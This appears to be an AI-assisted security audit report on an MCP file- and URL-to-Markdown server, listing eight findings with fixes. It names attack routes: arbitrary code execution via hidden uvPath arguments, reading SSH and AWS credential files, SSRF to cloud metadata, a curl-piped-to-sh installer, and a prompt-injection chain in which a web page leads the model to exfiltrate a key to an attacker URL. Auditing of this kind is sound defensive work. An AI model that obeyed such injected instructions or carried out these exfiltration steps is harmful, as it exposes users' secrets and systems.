# Agent & MCP security report

Scanned: `/tmp/blind/c06` · 2026-11-23T20:37:11+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 1 | 3 | 1 | 3 | 0 | 0 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **10** · agent/MCP code files: **3** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · Tool arguments choose the executable that is run (uvPath / projectRoot)
`None:None` · ASI05 Unexpected Code Execution

Every conversion tool accepts hidden uvPath and projectRoot arguments (not in the advertised schema, but parsed by the Zod schema) and execFile runs uvPath as the program, with projectRoot/.venv/bin/markitdown as the script; an injected call with uvPath set to any binary or script (e.g. a UNC path \\attacker\share\x.exe on Windows, or any planted file) gets code execution. execFile avoids shell parsing but not the choice of program.
> `src/server.ts:17` — `uvPath: z.string().optional(),`
> `src/server.ts:68` — `uvPath: validatedArgs.uvPath || process.env.UV_PATH,`
> `src/Markdownify.ts:25` — `const venvPath = path.join(projectRoot, ".venv");`

**Fix:** Remove uvPath and projectRoot from RequestPayloadSchema; take the uv path only from operator config (UV_PATH env / fixed default) and projectRoot only from the install directory.

### M002 · HIGH · Conversion tools read any file on disk and return its contents
`None:None` · ASI02 Tool Misuse and Exploitation

pdf/image/audio/docx/xlsx/pptx-to-markdown pass the filepath argument to markitdown with no directory restriction (MD_SHARE_DIR is only applied to get-markdown-file), and markitdown converts plain-text files too, so filepath=~/.ssh/id_rsa or ~/.aws/credentials returns the secret to the model.
> `src/server.ts:82` — `filePath: validatedArgs.filepath,`
> `src/Markdownify.ts:104` — `inputPath = filePath;`
> `src/Markdownify.ts:43` — `filePath,`

**Fix:** Resolve the path with fs.realpath, require it to be inside an allowed directory via path.relative (no leading '..'), check the extension matches the tool, and reject values starting with '-'.

### M004 · HIGH · URL tools: private-IP check on the literal hostname only; DNS names and redirects bypass it
`None:None` · ASI02 Tool Misuse and Exploitation

The check only inspects the hostname string, so a domain that resolves to 127.0.0.1/169.254.169.254, or a public URL that 302-redirects to an internal address (fetch follows redirects by default), reaches internal services and cloud metadata and the response body is returned to the model.
> `src/server.ts:61` — `if (is_ip_private(parsedUrl.hostname)) {`
> `src/Markdownify.ts:90` — `const response = await fetch(url);`

**Fix:** Resolve the hostname and reject private/loopback/link-local/IPv6-local addresses, connect to the checked IP, use redirect: 'manual' and re-check every hop, and cap response size and time.

### M005 · HIGH · Untrusted web content + arbitrary file read + outbound fetch in one server, no approval
`None:None` · ASI01 / ASI02 (untrusted input + private data + way out)

A web page converted by webpage-to-markdown can instruct the model to read ~/.ssh/id_rsa with a file tool (M002) and then call webpage-to-markdown with https://attacker/?d=<secret>, exfiltrating it; nothing requires user approval between steps.
> `src/server.ts:65` — `result = await Markdownify.toMarkdown({`
> `src/server.ts:105` — `{ type: "text", text: result.text },`

**Fix:** Fix M002 (restrict file reads to a sandbox), mark fetched content as untrusted data, and require human approval for URL fetches that follow file reads.

### M003 · MEDIUM · get-markdown-file share-dir check is a prefix test on an unresolved path, and off by default
`None:None` · ASI02 Tool Misuse and Exploitation

Without MD_SHARE_DIR any .md/.markdown file on disk can be read; with it, startsWith without a trailing separator lets /share-evil/x.md pass for /share, symlinks inside the share are not resolved, and the read uses the raw filePath rather than the checked path. Limited to Markdown-extension files.
> `src/Markdownify.ts:138` — `if (process.env?.MD_SHARE_DIR) {`
> `src/Markdownify.ts:142` — `if (!normPath.startsWith(allowedShareDir)) {`
> `src/Markdownify.ts:151` — `const text = await fs.promises.readFile(filePath, "utf-8");`

**Fix:** Require MD_SHARE_DIR (or a default sandbox), realpath both the root and the target, check path.relative(root, target) does not start with '..' and is not absolute, and read the checked real path.

### M006 · LOW · Fetched web/YouTube/Bing content returned raw to the model
`None:None` · 

Converted third-party page text goes straight into the model context unmarked, which is how injected instructions reach the agent.
> `src/server.ts:105` — `{ type: "text", text: result.text },`

**Fix:** Wrap returned content in clear untrusted-data delimiters and tell the client it is external content.

### M007 · LOW · Unbounded fetch: no timeout or size limit
`None:None` · 

Any URL is downloaded fully into memory and to disk with no size cap or timeout, so a huge or never-ending response exhausts memory/disk.
> `src/Markdownify.ts:98` — `const arrayBuffer = await response.arrayBuffer();`

**Fix:** Use an AbortController timeout and stop reading after a maximum byte count.

### M008 · LOW · npm preinstall pipes a remote script to sh
`None:None` · ASI04 Agentic Supply Chain

Installing the package runs an unpinned, unverified remote installer script; a compromised download host or proxy gets code execution on the installer's machine.
> `package.json:19` — `"preinstall": "node preinstall.js",`
> `setup.sh:6` — `curl -LsSf https://astral.sh/uv/install.sh | sh`

**Fix:** Drop the preinstall hook and document installing uv separately, or download a pinned version and verify its checksum.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
